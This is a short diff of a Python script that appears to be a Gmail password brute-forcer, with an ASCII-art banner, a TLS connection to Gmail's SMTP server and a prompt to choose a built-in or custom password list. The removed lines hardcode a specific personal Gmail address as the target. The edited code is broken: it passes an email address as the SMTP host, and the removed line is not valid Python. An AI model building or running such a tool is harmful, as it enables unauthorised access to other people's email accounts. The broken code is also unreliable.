@@ -27,12 +27,12 @@ def artwork():
           ░        ░         ░  ░ ░      ░  ░ ░  ░  ░      ░  ░░ ░      ░  ░
                                                                ░''')
 artwork()
-smtp = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
+smtp = smtplib.SMTP("janice6620@gmail.com", GMAIL_PORT)
 
 smtp.ehlo()
 smtp.starttls()
 
-user = janice6620@gmail.com
+user = input("enter email")
 pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '1' to Add a custom password list\nOptions: ")
 
 if pwd=='0':
